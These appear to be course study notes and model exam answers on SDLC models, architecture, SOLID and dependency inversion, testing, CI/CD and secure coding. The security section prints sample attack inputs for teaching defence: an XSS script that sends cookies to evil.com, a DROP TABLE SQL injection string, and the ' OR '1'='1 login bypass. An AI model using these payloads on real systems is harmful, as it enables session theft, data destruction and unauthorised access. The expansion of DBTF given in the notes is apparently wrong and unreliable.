Development methodologies

From traditional plan-driven to modern agile approaches

Develop in small, manageable cycles. Each iteration refines requirements, design, and implementation — producing a working increment plus lessons learned.

Key idea: You can course-correct after each cycle. Requirements do not need to be perfect upfront.
Continuous iteration of development and testing throughout the project, guided by customer feedback. Agile values emphasise:

• Individuals & interactions over processes & tools
• Working software over comprehensive documentation
• Customer collaboration over contract negotiation
• Responding to change over following a plan
Agile framework focused on high-quality code, strong feedback loops, and frequent releases. Common XP practices:

• Pair programming — two developers, one keyboard
• Continuous integration — merge & test constantly
• Refactoring — improve code without changing behaviour
• Short release cycles — deliver small increments often
• Test-first development — write tests before code
An adaptive model based on prototyping and iterative delivery. Four key phases:

1. Requirements planning — define scope and objectives
2. User design — collaborative prototyping with users
3. Construction — build and refine the prototype into production code
4. Cutover — user testing, training, and deployment

Benefits: faster time-to-market, increased user feedback.
Trade-off: can increase rework if quality gates are ignored.
A structured workshop process to collect business requirements collaboratively. Participants:

• Facilitator — guides the session and keeps it on track
• End-users — provide domain knowledge and validate needs
• Developers — contribute technical feasibility insights

Goal: shorten development time by reducing errors in the requirements phase. Reduces the back-and-forth of traditional interviews.
Shifts from detecting errors to preventing errors by design. Reliability is integrated into the primitive structures of the system.

FMaps (Functional Maps) — represent "What" the system does (hierarchical decomposition of functions)
TMaps (Type Maps) — represent "Data" (abstract data types and relationships)

DBTF maps each FMap function to a corresponding TMap type, keeping behaviour and data in sync.

Key benefit: reduces maintenance and re-engineering costs by preventing defects from entering the codebase.

Software architecture

Patterns, principles, and structural blueprints for scalable systems

Definition: Software architecture is the high-level structure of a software system — defining components, relationships, and the blueprint that guides development, scalability, and maintenance.

Architectural patterns

Organises a system into horizontal layers, each with a distinct responsibility:

Presentation layer — the user interface
Application layer — application services and use-case orchestration
Business logic layer — core domain rules
Data layer — database access and storage

Each layer only communicates with the layer directly below it. Changes are isolated to their layer.
Clients send requests; servers process them and return results. Common in web applications and databases.

Advantages: centralised data management, clear separation of concerns, easy to scale the server.
Disadvantage: server is a single point of failure without redundancy.
System built as a collection of small, independently deployable services. Services communicate via APIs (typically REST or message queues).

• Highly scalable and flexible — each service scales independently
• Used by Netflix, Amazon, Spotify
• Amazon's migration from monolith → microservices enabled faster deployments, scaling, and improved reliability

Trade-off: increases operational complexity (service discovery, distributed tracing, inter-service failures).
Components communicate by emitting and reacting to events rather than direct calls. A publisher fires an event; one or many subscribers react.

Use cases: real-time analytics, IoT, notification systems, loosely-coupled integrations.
Common tools: Apache Kafka, RabbitMQ, AWS EventBridge.

Architecture comparison

Pattern Structure Best for Drawback
Layered Horizontal tiers Business apps, enterprise systems Changes may ripple through layers
Client–Server Request/response Web apps, databases Single point of failure
Microservices Independent services High-scale, rapid iteration Operational complexity
Event-Driven Publish/subscribe Real-time, decoupled systems Hard to trace event flow

Core design principles

Separation of concerns

Each module handles one concern only. Changes to one area should not force changes elsewhere. Foundation of good architecture.

Modularity

Divide the system into independent modules with well-defined interfaces. Enables parallel development and easier testing.

Reusability

Design components so they can be used in multiple contexts. Reduces duplication and accelerates development.

Avoid technical debt

Poor design decisions accumulate interest. Refactor incrementally; do not let shortcuts compound over time.

SOLID principles & DIP

Five principles for building flexible, maintainable object-oriented systems

S
Single Responsibility
A class should have one, and only one, reason to change. One responsibility per class.
O
Open / Closed
Classes should be open for extension but closed for modification. Extend, don't edit.
L
Liskov Substitution
Subclasses must be substitutable for their base classes without breaking behaviour.
I
Interface Segregation
No client should be forced to depend on interfaces it does not use. Keep interfaces focused.
D
Dependency Inversion
Depend on abstractions, not on concrete implementations. High-level ≠ depends on low-level.

Dependency Inversion Principle — deep dive

Without DIP — tight coupling

The problem

  • Changing one technology forces code changes throughout business logic
  • Business logic is hard to test (needs real infrastructure)
  • Refactoring is risky and expensive
  • Replacing vendors is painful — code is tied to one implementation
With DIP — loose coupling

The solution

  • Implementations can be swapped with minimal impact
  • Unit tests use mocks or fakes — no real infrastructure needed
  • Architecture is easier to extend
  • Systems are more maintainable over time

Code examples

Notification directly creates an EmailService. If SMS is needed later, Notification must change.
class EmailService {
  void sendEmail(String msg) { ... }
}

class Notification {
  EmailService email = new EmailService(); // ❌ tight coupling

  void send(String msg) {
    email.sendEmail(msg);
  }
}
Result: Notification depends on a low-level detail instead of an abstraction.
Introduce a MessageService interface. Both EmailService and SMSService implement it. Notification only knows the interface. 
interface MessageService {
  void sendMessage(String msg);
}

class EmailService implements MessageService {
  public void sendMessage(String msg) { ... }
}

class SMSService implements MessageService {
  public void sendMessage(String msg) { ... }
}

class Notification {
  private MessageService service; // ✅ depends on abstraction

  Notification(MessageService service) {
    this.service = service; // injected from outside
  }

  void send(String msg) {
    service.sendMessage(msg);
  }
}
Switching from Email to SMS only changes the construction code, not Notification logic.
Without DIP: OrderService → StripeAPI
Any Stripe API change ripples into core business logic. Tests require real Stripe credentials.

With DIP: OrderService → PaymentGateway interface → (Stripe | PayPal | PayHere)
Business rules stay stable while vendors remain replaceable. Tests use a mock PaymentGateway.
Key distinction: DIP is a design principle; Dependency Injection (DI) is one common implementation technique. Frameworks like Spring, ASP.NET Core, Angular, and NestJS all support DI.
Red flags — DIP violation: A business class creates its own DB or API objects · Changing vendors requires editing core logic · Tests fail without real infrastructure · Code depends on one concrete class everywhere

Testing & Software Quality Assurance

SQA principles, testing levels, TDD, and CI/CD

SQA definition: Ensures software meets quality standards through defect prevention, reviews, testing, and disciplined processes. Goal: reliable and maintainable systems.

Testing levels

Level 1

Unit testing

Tests the smallest individual components in isolation. Fast to run, easy to pinpoint failures.

Example: calculateDiscount(100) → 90
Tools: JUnit, NUnit, Jest, pytest
Level 2

Integration testing

Tests the interaction between modules. Verifies that components work together correctly.

Example: Login module + database connection — verify authentication flow
Focus: Interfaces between modules
Level 3

System testing

Tests the complete, integrated system against requirements. Validates end-to-end behaviour.

Example: Full e-commerce flow — Search → Cart → Payment
Checks: Performance and reliability
Level 4

Acceptance testing

Real users test the system to validate it meets business requirements. Final approval stage before go-live.

Example: User tests banking app — can transfer money successfully
Validates: Business requirements met
TDD cycle

Test-Driven Development

Write tests before writing code. Forces small, testable, well-designed units.

1 Write test → watch it fail ✗
2 Write minimal code → make it pass ✓
3 Refactor the code, keep tests green
CI/CD

Continuous Integration & Delivery

  • CI: Developer pushes code → build + test automatically triggered
  • CD: Verified builds deploy to staging or production automatically
  • Detects errors early, improves team workflow
  • Reduces integration risk through frequent, small merges

Testing pyramid

Aim for a balanced pyramid: lots of unit tests, fewer integration tests, minimal UI tests

CI vs. CD explained

CI

Continuous Integration

Every code push triggers an automated build and test run. Detects integration errors early, keeps the main branch always green.

  • Trigger: developer pushes to Git
  • Run automated tests
  • Build and package the project
  • Report pass / fail immediately
CD

Continuous Delivery / Deployment

After CI passes, the verified build is automatically released. No manual steps — reduces human error and release bottlenecks.

  • Triggered when CI passes
  • Push artefact to production / staging
  • Automated release pipeline
  • Rollback possible if monitors flag issues

CI/CD YAML example

A minimal CI/CD pipeline in YAML that builds, tests, and deploys on every push to main: 
name: CI/CD Pipeline

on:
  push:
    branches: [ main ]

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up JDK 17
        uses: actions/setup-java@v3
        with:
          java-version: '17'

      - name: Build project
        run: mvn clean package

      - name: Run tests
        run: mvn test

  deploy:
    needs: build-and-test
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to production
        run: echo "Deploying to server..."
Key concepts: on: push triggers the pipeline · jobs run in sequence · needs: build-and-test means deploy only runs if tests pass.

Software Security & Best Practices

Week 9 — Protecting systems from threats, vulnerabilities, and unauthorised access

Core definition: Software security is the practice of protecting systems from threats to ensure Confidentiality (data accessed only by authorised parties), Integrity (data is accurate and unmodified), and Availability (systems remain accessible when needed) — known as the CIA Triad.

Common vulnerabilities

Attack

SQL Injection

User input is directly embedded in a database query. An attacker manipulates the input to alter the query logic, potentially accessing, modifying, or deleting data.

SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
Attack

Cross-Site Scripting (XSS)

An attacker injects malicious JavaScript into a web page. The script executes in other users' browsers, stealing session tokens, cookies, or redirecting users.

<script>document.location='http://evil.com?c='+document.cookie</script>
Vulnerability

Broken Authentication

Weak session management, insecure credential storage, or missing MFA allows attackers to impersonate legitimate users and gain unauthorised access.

  • Weak or default passwords accepted
  • Session tokens not invalidated on logout
  • No brute-force protection
Vulnerability

Insecure APIs

APIs that lack authentication, expose sensitive data, or have no rate limiting are easy targets for automated attacks and data harvesting.

  • No token verification on endpoints
  • Sensitive data in API responses
  • Missing HTTPS encryption

Prevention techniques

Use prepared statements (parameterised queries): Input is treated as data, never as part of the SQL syntax.

// Vulnerable
String query = "SELECT * FROM users WHERE name = '" + input + "'";

// Secure — prepared statement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, input);
Additional defences: input validation and sanitisation · ORM frameworks (Hibernate, SQLAlchemy) · Least-privilege database accounts
Output encoding: Escape user-supplied content before rendering it in HTML so the browser treats it as text, not executable code.

• Use frameworks that auto-escape (React, Angular, Django templates)
• Apply Content Security Policy (CSP) headers to restrict script sources
• Validate and sanitise all input server-side
• Never inject raw user input into innerHTML or document.write()
Never store passwords in plain text. Proper password storage:

1. Hash the password — use bcrypt, Argon2, or PBKDF2 (slow-by-design algorithms).
2. Salt before hashing — add a unique random value per user before hashing to prevent rainbow table attacks.
3. SHA-256 context — SHA-256 is a fast hash and less suitable for passwords alone; bcrypt is preferred because its work factor makes brute-force expensive.

// Java example using BCrypt
String hashed = BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));
boolean match  = BCrypt.checkpw(plainPassword, hashed);
JWT (JSON Web Token): A compact, signed token passed in HTTP headers. The server verifies the signature without storing session state.

Structure: Header.Payload.Signature

Best practices:
• Always use HTTPS — encrypt data in transit
• Implement rate limiting — prevent brute-force and abuse
• Validate and sanitise all inputs at every endpoint
• Use short-lived tokens with refresh token rotation
• Return minimal data — never expose sensitive fields unnecessarily

Authentication vs. Authorisation

Authentication

Who are you?

Verifies the identity of a user. The system checks credentials (password, biometric, OTP) and confirms the user is who they claim to be.

  • Login with username + password
  • OTP (one-time password)
  • Biometric scan
  • OAuth / social login
Authorisation

What can you do?

Determines what resources an authenticated user may access. Enforces access control policies after identity is confirmed.

  • Role-based access control (RBAC)
  • Admin vs. read-only user permissions
  • API endpoint access restrictions
  • File and resource permissions
Key distinction: Authentication happens first (login). Authorisation happens after (what can this logged-in user do?). You cannot authorise without first authenticating.

Secure coding best practices

Input Validation

Never trust user input. Validate data type, length, format, and range on the server side — even if client-side validation exists.

Encryption

Encrypt sensitive data at rest (AES-256) and in transit (TLS/HTTPS). Never transmit credentials or tokens over unencrypted channels.

No Hardcoded Credentials

Never embed passwords, API keys, or secrets in source code. Use environment variables or secrets management tools (e.g. AWS Secrets Manager, HashiCorp Vault).

Least Privilege Principle

Grant each component and user only the minimum permissions needed. A compromised module with restricted access limits the blast radius of an attack.

Real-world example — Banking application

Case Study

Multi-Factor Authentication (MFA) in Banking

Modern banking apps combine multiple security layers:

  • Layer 1 — Authentication: Username + password (something you know)
  • Layer 2 — MFA: OTP sent via SMS or authenticator app (something you have)
  • Layer 3 — Authorisation: Role-based — teller vs. manager vs. admin have different access rights
  • Layer 4 — Monitoring: Continuous anomaly detection flags unusual transactions in real time
  • Layer 5 — Encryption: All transactions are encrypted end-to-end over HTTPS/TLS

SDLC & Development Models

Answer:

The Software Development Life Cycle (SDLC) is a structured framework that guides the creation, deployment, and maintenance of software systems from initial conception through to retirement.

Core phases:
1. Requirement Analysis — Stakeholders and analysts define exactly what the system must do. Outputs include requirement specifications and use cases.
2. System Design — The architecture, data models, and technology stack are planned. High-level and detailed designs are produced.
3. Implementation — Developers translate the design into working code following coding standards.
4. Testing — QA engineers verify that the software behaves correctly. Defects are identified and resolved.
5. Deployment — The tested product is released to the live environment and made available to users.
6. Maintenance — Ongoing bug fixes, performance improvements, and adaptations to changing requirements are applied post-release.

Significance: The SDLC provides discipline and predictability. Without it, projects risk scope creep, poor quality, and cost overruns. Standards such as ISO/IEC/IEEE 12207 formalise SDLC processes across the industry.
Answer:

Both the Waterfall model and the V-Model are plan-driven, sequential approaches derived from the same linear philosophy, but they differ significantly in how they treat testing.

Waterfall: Phases flow strictly in sequence — Requirements → Design → Implementation → Testing → Deployment. Testing is a single phase that occurs after implementation is complete, making it expensive to catch defects late.

V-Model: Extends Waterfall by pairing each development phase with a corresponding test phase. Requirements are paired with Acceptance Testing; System Design with System Testing; Detailed Design with Unit Testing. Testing is planned upfront rather than deferred.

Key difference: V-Model enforces early test planning and provides strong traceability between requirements and test cases. Waterfall provides none of this pairing.

When to choose Waterfall: Projects with very stable, well-understood requirements and heavy documentation culture — e.g., government procurement contracts.

When to choose V-Model: High-assurance, safety-critical, or compliance-driven systems where every requirement must have a matching test — e.g., medical devices, aviation software, banking systems.

Both models carry a high cost of change; neither suits dynamic or evolving requirements.
Answer:

Verification and Validation are two complementary quality assurance activities, often confused but serving distinct purposes.

Verification asks: "Are we building the product right?" It checks that the software conforms to its specification through process-based activities such as code reviews, walkthroughs, inspections, and design reviews. Verification happens throughout development — it does not require runnable software.

Validation asks: "Are we building the right product?" It checks that the completed software meets the actual needs of the user by executing tests on working software — unit tests, system tests, and acceptance tests.

Why the V-Model centres this distinction: The left arm of the V represents Verification activities (reviewing requirements and designs) while the right arm represents Validation activities (running tests against the completed system). By structurally separating them, the V-Model ensures that test plans are written at the same time as specifications — if you write requirements, you simultaneously plan acceptance tests. This prevents the common failure mode where testing is treated as an afterthought.

In practice, neglecting Verification leads to building a product that passes all tests but misses the user's actual needs; neglecting Validation leads to software that never proves it works.

Outsourcing & UX

Answer:

The Make vs. Buy decision is a strategic choice organisations face when meeting a software need: build a custom solution in-house or purchase an off-the-shelf or third-party product.

Arguments for Make (custom development):
• Unique competitive advantage requiring proprietary features
• Strict security or data sovereignty requirements
• Complex integration with existing legacy systems
• Full control over the roadmap and intellectual property

Arguments for Buy (commercial/open-source):
• Faster time-to-market — avoid building commodity features
• Lower upfront cost — leverage existing vendor investment
• Vendor handles maintenance, updates, and security patches
• Proven reliability and community support

Key influencing factors:
1. Strategic fit — Is this a core differentiator or a commodity need?
2. Budget and timeline — Can the organisation afford and sustain custom development?
3. Vendor lock-in risk — How dependent will the organisation become on a single supplier?
4. Customisation needs — Can a commercial product be adapted enough, or will it constrain business processes?

In practice, many organisations adopt a hybrid approach — buying commodity components (authentication, payments) while building differentiating features.
Answer:

UI and UX are closely related but fundamentally different aspects of product design.

User Interface (UI) refers to the visual and interactive elements a user directly engages with — buttons, typography, colour palettes, icons, layout, and screen flows. It answers: "What does the system look like?"

User Experience (UX) encompasses the entire journey a user has with a product — ease of use, emotional response, trust, satisfaction, and whether users can successfully achieve their goals. It answers: "How does using the system feel?"

A system can have beautiful UI and terrible UX — imagine a visually stunning banking app where transferring money takes 14 steps. Conversely, a simple-looking tool with excellent UX (e.g., Google Search) can dominate a market.

Why UX is critical:
1. User retention — Poor UX drives users away; good UX builds loyalty
2. Reduced support costs — Intuitive design means fewer help desk calls
3. Competitive advantage — Products with superior UX win market share even against feature-equivalent rivals
4. Accessibility — Inclusive UX ensures software is usable by people of all abilities

UX design methods — personas, user stories, prototyping, and usability testing — are applied throughout the SDLC, not just at the end.

Modern Methodologies

Answer:

Agile is an iterative, incremental software development methodology guided by the Agile Manifesto (2001). Rather than delivering software in one final release, Agile delivers working increments in short cycles called sprints (typically 1–4 weeks), continuously incorporating customer feedback.

Agile core values:
• Individuals and interactions over processes and tools
• Working software over comprehensive documentation
• Customer collaboration over contract negotiation
• Responding to change over following a plan

Waterfall vs. Agile comparison:
Flexibility: Waterfall is rigid — requirements are fixed upfront; Agile accommodates change at any sprint boundary.
Delivery: Waterfall delivers one final product; Agile delivers potentially shippable increments continuously.
Customer involvement: Waterfall involves customers mainly at requirements and acceptance; Agile involves them throughout.
Documentation: Waterfall is document-heavy; Agile favours lightweight documentation.

Trade-offs of Agile:
+ Faster response to change, higher user satisfaction, early risk detection
– Harder to predict final cost and scope, requires disciplined teams and active customer participation, can produce inconsistent documentation unsuitable for regulated industries

Design By Total Functionality (DBTF) is an approach to software design that shifts the quality focus from detecting errors after they occur to preventing errors from ever entering the system by integrating reliability into the most primitive design structures.

Traditional approach: Errors are introduced during design and implementation, discovered during testing, and then fixed — an expensive cycle that pushes defect resolution cost to the end of the project.

DBTF approach: Reliability is a design property, not a testing property. DBTF achieves this through two primitive structures:

FMaps (Functional Maps) — hierarchically decompose what the system does. Every function is explicitly mapped and has a defined, unambiguous responsibility. This prevents overlapping or missing functionality.

TMaps (Type Maps) — define the abstract data types and their relationships. Every FMap function is paired with a corresponding TMap, keeping behaviour and data consistently aligned.

Key benefit: By designing to zero-defect primitives, DBTF dramatically reduces maintenance and re-engineering costs. Systems built with DBTF primitives have lower defect density from the outset because the design itself prohibits entire categories of errors.

This makes DBTF particularly valuable for long-lived, high-maintenance systems where accumulated technical debt is costly.

Software Architecture

Answer:

Monolithic architecture packages all application components — UI, business logic, and data access — into a single deployable unit. Simple to develop initially, but as the application grows, it becomes harder to maintain, test, and scale.

Microservices architecture decomposes the application into a collection of small, independently deployable services, each responsible for a specific business capability and communicating via lightweight APIs (typically REST or message queues).

Advantages of microservices:
1. Independent scalability — scale only the services under load (e.g., scale the payment service without scaling the user profile service)
2. Technology flexibility — each service can use the most appropriate language or database
3. Fault isolation — a failure in one service does not bring down the entire application
4. Faster deployments — teams deploy their service independently without coordinating a monolith release
5. Real-world adoption — Netflix, Amazon, and Spotify all migrated from monolith to microservices to support scale

Challenges of microservices:
1. Operational complexity — managing dozens of services requires service discovery, distributed tracing, and orchestration (e.g., Kubernetes)
2. Network latency — inter-service calls over the network are slower than in-process function calls
3. Data consistency — distributed transactions across services are hard to manage
4. Team overhead — each service needs its own CI/CD pipeline, monitoring, and on-call ownership

Microservices are best suited for large, high-scale systems with multiple independent teams; monoliths remain appropriate for small applications and early-stage products.

The Layered (N-Tier) architecture organises a software system into horizontal layers, each with a specific responsibility. The most common form is the three-tier model:

1. Presentation Layer (UI) — handles user interaction; displays data and captures input
2. Business Logic Layer (Application) — processes rules, workflows, and calculations; the core of the application
3. Data Access Layer (Persistence) — manages communication with the database; abstracts storage details from business logic

Why it is widely used:
1. Separation of concerns — each layer has one responsibility, making code easier to understand and modify
2. Maintainability — changes in one layer (e.g., switching databases) do not require changes in other layers if interfaces are respected
3. Testability — business logic can be tested independently without a database
4. Familiarity — the pattern is well understood and supported by frameworks (Spring MVC, ASP.NET MVC, Django)
5. Team organisation — frontend, backend, and database teams can work in parallel on separate layers

Drawback: Changes that span multiple layers (e.g., adding a new field) require coordinated edits across all layers, which can slow development on large teams. This is sometimes called the "change ripple" problem.

SOLID Principles & DIP

Answer:

SOLID is an acronym for five object-oriented design principles that promote flexible, maintainable, and scalable code.

S — Single Responsibility Principle (SRP): A class should have one, and only one, reason to change. Example: A UserService class should handle user business logic, not also send emails. Mixing concerns makes classes fragile to unrelated changes.

O — Open/Closed Principle (OCP): Classes should be open for extension but closed for modification. Add new behaviour by creating new classes (e.g., subclasses or new interface implementations) rather than editing existing code, which risks introducing bugs.

L — Liskov Substitution Principle (LSP): Subclasses must be substitutable for their base class without altering the correctness of the program. If Bird has a fly() method, a Penguin subclass that throws an exception violates LSP.

I — Interface Segregation Principle (ISP): No client should be forced to depend on methods it does not use. Prefer many small, focused interfaces over one large general-purpose interface — e.g., separate Printable and Scannable interfaces rather than one AllInOnePrinter interface.

D — Dependency Inversion Principle (DIP): High-level modules should not depend on low-level modules; both should depend on abstractions. Example: OrderService should depend on a PaymentGateway interface, not directly on StripeService. This allows the payment provider to be swapped without touching business logic.
Answer:

The Dependency Inversion Principle (DIP) states that:
1. High-level modules should not depend on low-level modules. Both should depend on abstractions.
2. Abstractions should not depend on details. Details should depend on abstractions.

Without DIP (tight coupling): A Notification class that directly instantiates an EmailService is tightly coupled to that specific implementation. If the team later needs SMS notifications, the Notification class must be edited — violating OCP and risking regressions.

With DIP (loose coupling): Introduce a MessageService interface. Both EmailService and SMSService implement it. Notification depends only on MessageService — the concrete implementation is injected at construction time (Dependency Injection).

Why it improves maintainability:
1. Swap implementations freely — change from email to SMS by swapping the injected object, not editing core logic
2. Testability — unit tests inject a mock MessageService without needing a real email server
3. Extensibility — new notification channels (push, WhatsApp) require only a new class, not changes to existing code
4. Reduced regression risk — stable interfaces mean changing a low-level detail cannot break high-level business logic

Frameworks such as Spring (Java), ASP.NET Core (.NET), and Angular (TypeScript) provide built-in Dependency Injection containers that automate this principle at scale.

Testing & SQA

Answer:

Software testing is typically structured into four levels, each targeting a different scope of the system.

Level 1 — Unit Testing: Tests the smallest individual component (a function, method, or class) in isolation from the rest of the system. Fast to run, easy to pinpoint failures. Tools: JUnit, Jest, pytest, NUnit. Example: testing that calculateDiscount(100) returns 90.

Level 2 — Integration Testing: Tests the interactions between two or more components or modules. Verifies that components work correctly together — e.g., the login module communicating with the database. Detects interface defects that unit tests cannot find.

Level 3 — System Testing: Tests the fully integrated system against the documented requirements. Validates end-to-end behaviour — e.g., a complete e-commerce flow from product search through payment. Also checks non-functional properties such as performance and reliability.

Level 4 — Acceptance Testing: Conducted by real end-users to validate that the system meets business requirements and is ready for production. This is the final approval stage before go-live. Example: users verify they can successfully transfer money in a banking app.

Testing Pyramid principle: Invest heavily in unit tests (many, fast, cheap), moderately in integration tests, and minimally in UI/end-to-end tests (few, slow, expensive). This balances coverage with execution speed.
Answer:

Test-Driven Development (TDD) is a software development practice where tests are written before the production code they are intended to verify. The TDD cycle, known as Red–Green–Refactor, proceeds as follows:

Step 1 — Red: Write a failing test that specifies the desired behaviour. The test fails because no implementation exists yet.
Step 2 — Green: Write the minimal code necessary to make the test pass. No more, no less.
Step 3 — Refactor: Improve the design of the code — remove duplication, clarify naming, extract methods — while keeping all tests green.

Benefits of TDD:
1. Forces small, well-defined, testable units — improves design quality
2. Creates a comprehensive test suite that acts as a safety net for future changes
3. Reduces debugging time — the failing test immediately identifies where the problem is
4. Provides living documentation — tests describe the intended behaviour of every component
5. Enables confident refactoring — developers can restructure code without fear of breaking behaviour

Limitations of TDD:
1. Slower initial development — writing tests first feels counter-intuitive and takes practice
2. Requires discipline and team buy-in — skipping the red phase defeats the purpose
3. Poorly written tests can be brittle — over-coupling tests to implementation details increases maintenance cost
4. UI and integration scenarios are harder to TDD than pure business logic

TDD is most valuable for complex business logic and services with well-defined inputs and outputs.

DevOps & CI/CD

Answer:

DevOps is a cultural and technical movement that merges software Development and IT Operations teams into a unified, collaborative workflow with the shared goal of delivering high-quality software faster and more reliably.

The traditional problem: In siloed organisations, development teams write code and "throw it over the wall" to operations teams to deploy. Conflicting incentives (Dev wants to change; Ops wants stability) create bottlenecks, finger-pointing, and slow release cycles.

How DevOps bridges this gap:
1. Shared ownership — developers are responsible for their code in production; operations teams participate in design discussions. "You build it, you run it."
2. Automation — CI/CD pipelines automate building, testing, and deploying code, removing manual handoff steps between teams
3. Continuous feedback — production monitoring data feeds directly back into the development planning cycle, closing the loop
4. Infrastructure as Code (IaC) — infrastructure is defined in version-controlled scripts (Terraform, Ansible), giving Dev and Ops a common language
5. Short feedback loops — frequent, small releases reduce the risk of each deployment and allow faster course-correction

Outcomes: Organisations that adopt DevOps report significantly faster deployment frequencies, lower change failure rates, and quicker recovery from incidents — measured by the DORA metrics (Deployment Frequency, Lead Time, MTTR, Change Failure Rate).
Answer:

A CI/CD pipeline is an automated workflow that takes source code from a developer's push to a version control system (e.g., Git) through a series of automated stages — build, test, and deploy — to deliver software to users reliably and repeatedly.

Continuous Integration (CI): Every code push triggers an automated build and test run. Developers receive rapid feedback if their change breaks existing functionality. This prevents "integration hell" caused by infrequent, large merges.

Continuous Delivery/Deployment (CD): Once CI passes, the verified artefact is automatically deployed to staging or production. CD depends on CI — it only runs if the build and tests succeed.

Typical pipeline stages:
1. Source — code push triggers the pipeline
2. Build — compile code and resolve dependencies
3. Test — run unit and integration tests; fail fast if any fail
4. Package — create a deployable artefact (JAR, Docker image)
5. Deploy — push to staging or production environment
6. Monitor — observe health metrics and trigger rollback if needed

YAML example (GitHub Actions): 
on:
  push:
    branches: [ main ]
jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: mvn clean package
      - run: mvn test
  deploy:
    needs: build-and-test
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying..."
The needs: build-and-test directive ensures deployment only runs after a successful build and test pass.

Software Security

Answer:

Software security is the practice of designing, implementing, and maintaining software systems in a way that protects them from unauthorised access, misuse, and attack throughout their lifecycle.

The CIA Triad is the foundational framework for information security, comprising three interdependent properties:

Confidentiality: Ensures that sensitive data is accessible only to authorised parties. Mechanisms include encryption, access controls, and authentication. Breach example: an attacker reading encrypted medical records.

Integrity: Ensures that data is accurate, complete, and has not been tampered with. Mechanisms include hashing, digital signatures, and audit logs. Breach example: an attacker modifying a financial transaction amount.

Availability: Ensures that systems and data remain accessible to authorised users when needed. Mechanisms include redundancy, failover, and DDoS protection. Breach example: a ransomware attack encrypting hospital records and halting patient care.

Why the CIA Triad is fundamental: Every security control can be mapped back to one or more of these three properties. When designing a system, developers must ask: "How does this feature protect confidentiality? How does it preserve integrity? How does it ensure availability?" This triad prevents security from being an afterthought and ensures it is embedded into architecture decisions from the beginning.

Real-world systems often face trade-offs — maximising availability (caching data widely) can threaten confidentiality. Security design requires balancing all three properties.
Answer:

SQL Injection (SQLi) is one of the most prevalent and dangerous web application vulnerabilities. It occurs when user-supplied input is incorporated directly into a database query without proper sanitisation, allowing an attacker to manipulate the query's logic.

How it works:
A vulnerable login form builds its query by string concatenation:
SELECT * FROM users WHERE username = 'input' AND password = 'pass'

An attacker enters: ' OR '1'='1 as the username. The resulting query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
Since '1'='1' is always true, the query returns all users — granting unauthorised access without a valid password.

Damage SQL injection can cause:
• Unauthorised authentication bypass
• Extraction of entire databases containing PII, passwords, or financial data
• Modification or deletion of records
• In some databases, execution of operating system commands

Prevention techniques:
1. Prepared statements / parameterised queries — the most effective defence; input is treated as data, never as SQL syntax
2. ORM frameworks — Hibernate, SQLAlchemy generate safe queries automatically
3. Input validation — reject input containing SQL metacharacters
4. Least privilege — the application's database account should have only the permissions needed (no DROP TABLE access)
5. Web Application Firewalls (WAF) — detect and block known SQLi patterns

SQL Injection consistently appears in the OWASP Top 10, underscoring its severity and prevalence.
Answer:

Cross-Site Scripting (XSS) is a client-side injection attack where malicious scripts are embedded into web pages viewed by other users. Unlike SQL Injection (which targets the server), XSS targets the victim's browser.

Types of XSS:
1. Reflected XSS: The malicious script is included in a URL. When the victim clicks the link, the server reflects the script back in the response, which the browser executes. Example: a search page that echoes the search term into the response without encoding.

2. Stored (Persistent) XSS: The attacker stores a malicious script in the database (e.g., in a comment or profile field). Every user who views that content has the script execute in their browser — more dangerous because no malicious URL is required.

3. DOM-based XSS: The vulnerability exists entirely in client-side JavaScript that unsafely reads from and writes to the DOM.

How it harms users:
• Session hijacking — steal authentication cookies
• Credential harvesting — redirect users to fake login pages
• Keylogging — capture everything the user types
• Malware distribution — force download of malicious files

Prevention strategies:
1. Output encoding — escape all user-supplied content before rendering it in HTML (e.g., < → &lt;)
2. Content Security Policy (CSP) — HTTP header that restricts which scripts the browser may execute
3. HttpOnly cookie flag — prevents JavaScript from accessing session cookies
4. Input validation — reject or sanitise dangerous characters server-side
5. Use secure frameworks — React, Angular, and Vue auto-escape output by default

Authentication and Authorisation are two distinct but interdependent security mechanisms that together control access to software systems.

Authentication is the process of verifying who a user is. The system confirms that the entity attempting to access it is who they claim to be. Common authentication methods include:
• Username and password
• One-Time Password (OTP) / Multi-Factor Authentication
• Biometric verification (fingerprint, facial recognition)
• OAuth / social login (Google, GitHub)
• Digital certificates

Authorisation is the process of determining what an authenticated user is allowed to do. Once identity is confirmed, the system enforces access control policies. Common authorisation models:
• Role-Based Access Control (RBAC) — users are assigned roles (Admin, Editor, Viewer)
• Attribute-Based Access Control (ABAC) — access based on user attributes and resource properties
• Least Privilege — grant only the minimum permissions required

Why both must be correct:
Authentication without proper authorisation: a user can log in but access data they should not (e.g., a customer viewing another customer's orders — an Insecure Direct Object Reference attack).

Authorisation without authentication: the system restricts actions but anyone can claim any identity — authorisation is meaningless without first confirming identity.

Sequence: Authentication always precedes authorisation. In a JWT-secured API, the token first proves identity (authentication), then scopes and claims in the token determine what endpoints can be called (authorisation).
Answer:

Password storage is one of the most critical security concerns for any application that manages user accounts. Incorrectly stored passwords can compromise every user if the database is breached.

Why plain-text storage is catastrophic: If an attacker gains read access to the database, all user passwords are immediately exposed. Since users reuse passwords across services, one breach can lead to account takeovers across the internet. High-profile examples include early LinkedIn and Adobe breaches involving plain-text or weakly hashed passwords.

Why simple hashing (MD5, basic SHA-256) is insufficient: These are fast algorithms. An attacker with a breach can compute billions of hashes per second on modern hardware, enabling brute-force and dictionary attacks. Pre-computed "rainbow tables" can reverse unsalted hashes instantly.

Correct techniques:

1. Salting: Before hashing, append a unique, randomly generated value (the "salt") to each user's password. This ensures two users with the same password produce different hashes, defeating rainbow tables.

2. Use slow hashing algorithms: Algorithms designed for password hashing are intentionally slow — making brute-force computationally expensive:
• bcrypt — industry standard; configurable work factor increases cost as hardware improves
• Argon2 — winner of the Password Hashing Competition; memory-hard
• PBKDF2 — NIST-approved; used in many compliance contexts

3. Never log passwords. Ensure passwords never appear in log files, error messages, or audit trails.

Example (Java/BCrypt): BCrypt.hashpw(password, BCrypt.gensalt(12)) — the 12 is the cost factor.

